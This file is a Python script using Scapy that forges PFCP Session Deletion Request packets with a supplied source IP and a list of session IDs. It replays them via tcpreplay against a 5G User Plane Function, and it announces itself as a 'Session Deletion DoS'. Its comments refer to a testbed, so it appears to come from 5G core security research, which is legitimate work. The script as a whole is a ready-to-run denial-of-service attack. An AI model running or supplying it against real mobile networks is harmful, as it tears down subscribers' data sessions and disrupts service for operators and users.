import socket
import sys
from scapy.all import *
from scapy.contrib.pfcp import *
import subprocess
import time
import random
from datetime import datetime
import ast

def write(pkt):
    wrpcap('sess-del.pcap', pkt, append=True)  #appends packet to output file

IP_src = sys.argv[1] #172.21.0.107 for k3y testbed
IP_dst = sys.argv[2] #172.21.0.110 for k3y testbed
iface = sys.argv[3] #eth0 for k3y testbed

print('Starting Session Deletion DoS with the following parameters:')
print()
print('Source IP =', sys.argv[1])
print('Destination IP =', sys.argv[2])
print('Selected Interface =', sys.argv[3])
print()
print("Target SEID is assumed to be equal to 0x1.")
print()
input("Press Enter to continue...")

#we create a session deletion and send it to the UPF
# SEID_cycle = 0x7ce
#SEID_list = [0x455, 0x274, 0x5a8, 0x8a6, 0x320, 0x535, 0x3a9, 0x42d, 0x5b9, 0xd07]
SEID_list = ast.literal_eval(sys.argv[4]) #liste seid
seq_cycle = 1
now = datetime.now()
debut = now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

for seid in SEID_list:
# time.sleep(random.randint(0,2))
 msg = 1
 ip_timestamp_option = IPOption_Timestamp(copy_flag=0, optclass='control', option='timestamp', flg=0, timestamp=int(msg))
 packet = Ether()/IP(src=IP_src,dst=IP_dst, options=[ip_timestamp_option])/UDP(sport=8805,dport=8805)/PFCP( version=1, spare_b2=0x0, spare_b3=0x0, spare_b4=0x0, MP=0, S=1, message_type=54, length=12, seid=seid, seq=seq_cycle, spare_oct=0)
 print(packet.show())
 packet_converted = bytes(packet) #to kanw convert se raw bytes
 write(packet_converted) #to trexv me ta converted packets
 subprocess.run(["tcpreplay", "-i", iface, "sess-del.pcap"])
 subprocess.run(["rm", "-f", "sess-del.pcap"])
#  SEID_cycle = SEID_cycle + 1
 seq_cycle = seq_cycle + 1
now = datetime.now()
print("Début à : ",debut)
print("Arrêt à : ",now.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3])
